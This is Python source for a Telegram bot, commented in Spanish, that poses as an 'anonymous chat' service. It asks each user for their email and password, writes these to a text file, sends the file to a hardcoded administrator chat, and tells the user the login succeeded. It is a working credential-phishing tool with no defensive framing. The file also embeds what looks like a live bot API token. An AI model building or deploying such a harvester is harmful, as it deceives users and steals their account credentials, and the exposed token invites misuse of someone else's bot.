import telebot
from telebot import types
import os

# Aquí va tu token del bot de Telegram
API_TOKEN = '6944469694:AAGfhZMyoTfGoT8IxmRfeDGu-A5-ppoxWdk'

# ID del administrador al que se enviarán los archivos
ADMIN_CHAT_ID = 5576847505

bot = telebot.TeleBot(API_TOKEN)

# Diccionario para almacenar temporalmente las credenciales y sesiones de los usuarios
user_data = {}
sessions = {}

# Comando /start para iniciar el bot
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn = types.KeyboardButton('Iniciar sesión')
    markup.add(btn)
    bot.send_message(message.chat.id, "¡Bienvenido al chat anónimo! por favor inicia sesión para comenzar a conversar anónimamente.", reply_markup=markup)

# Manejador para iniciar sesión
@bot.message_handler(func=lambda message: message.text == "Iniciar sesión")
def request_login(message):
    bot.send_message(message.chat.id, "Por favor, introduce tu Correo Electrónico:")
    bot.register_next_step_handler(message, get_email)

# Recopilar el correo electrónico
def get_email(message):
    user_data[message.chat.id] = {'email': message.text}
    bot.send_message(message.chat.id, "Gracias, ahora introduce tu contraseña:")
    bot.register_next_step_handler(message, get_password)

# Recopilar la contraseña
def get_password(message):
    user_data[message.chat.id]['password'] = message.text
    email = user_data[message.chat.id]['email']
    password = user_data[message.chat.id]['password']
    
    bot.send_message(message.chat.id, f"¡Inicio de sesión exitoso! Tu correo: {email}")
    
    # Guardar sesión del usuario
    sessions[message.chat.id] = {'email': email, 'anonymous_name': f'Usuario_{message.chat.id}'}
    
    # Crear archivo con las credenciales y enviarlo al administrador con manejo de errores
    try:
        create_and_send_credentials_to_admin(email, password)
    except Exception as e:
        bot.send_message(message.chat.id, "Hubo un error al crear y enviar las credenciales, intenta de nuevo más tarde.")
        print(f"Error al enviar credenciales al administrador: {e}")
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_chat = types.KeyboardButton('Iniciar Chat Anónimo')
    markup.add(btn_chat)
    bot.send_message(message.chat.id, "Presiona 'Iniciar Chat Anónimo' para comenzar a conversar.", reply_markup=markup)

# Crear archivo txt con las credenciales del usuario y enviarlo al administrador
def create_and_send_credentials_to_admin(email, password):
    # Nombre del archivo temporal
    filename = f'credentials_{email}.txt'
    
    # Crear el archivo .txt con email y contraseña
    with open(filename, 'w') as file:
        file.write(f'Email: {email}\n')
        file.write(f'Contraseña: {password}\n')
    
    # Enviar el archivo al administrador
    with open(filename, 'rb') as file:
        bot.send_document(ADMIN_CHAT_ID, file)
    
    # Eliminar el archivo después de enviarlo
    os.remove(filename)

# Manejador para iniciar chat anónimo
@bot.message_handler(func=lambda message: message.text == "Iniciar chat anónimo")
def anonymous_chat(message):
    if message.chat.id in sessions:
        bot.send_message(message.chat.id, "Estás conectado de manera anónima, escribe un mensaje para enviarlo.")
        bot.register_next_step_handler(message, handle_chat_message)
    else:
        bot.send_message(message.chat.id, "No has iniciado sesión, usa /start para comenzar.")

# Enviar mensajes anónimos
def handle_chat_message(message):
    if message.chat.id in sessions:
        anonymous_name = sessions[message.chat.id]['anonymous_name']
        for user_id in sessions:
            if user_id != message.chat.id:
                bot.send_message(user_id, f"{anonymous_name}: {message.text}")
        bot.register_next_step_handler(message, handle_chat_message)
    else:
        bot.send_message(message.chat.id, "Tu sesión ha expirado, inicia sesión de nuevo con /start.")

# Comando /logout para cerrar sesión
@bot.message_handler(commands=['logout'])
def logout(message):
    if message.chat.id in sessions:
        del sessions[message.chat.id]
        bot.send_message(message.chat.id, "Has cerrado sesión.")
    else:
        bot.send_message(message.chat.id, "No estabas conectado.")

# Iniciar el bot
bot.polling(none_stop=True)
